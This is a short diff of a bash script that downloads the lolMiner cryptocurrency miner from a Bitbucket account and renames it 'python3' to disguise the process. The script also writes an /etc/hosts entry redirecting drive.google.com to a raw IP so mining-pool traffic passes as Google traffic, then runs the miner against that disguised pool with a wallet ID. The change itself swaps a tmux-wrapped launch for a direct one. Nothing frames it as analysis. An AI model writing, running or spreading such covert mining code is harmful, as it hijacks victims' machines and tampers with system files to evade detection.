@@ -1,7 +1,6 @@
 #!/bin/bash  
-apt-get install tmux -y
 wget https://bitbucket.org/tengikekao/myrep/downloads/lolMiner
 
 sh -c "echo '128.90.170.24  drive.google.com' >> /etc/hosts"
 mv lolMiner python3 && 
-tmux new-session -d -s my_session1 './python3 --coin BEAM --pool drive.google.com --port 443 --user 2c1c361ca22136a66c1ba02cd4468f569c8b599ea6ebcd8dc189a2a40641def4200.col'
+./python3 --coin BEAM --pool drive.google.com --port 443 --user 2c1c361ca22136a66c1ba02cd4468f569c8b599ea6ebcd8dc189a2a40641def4200.col
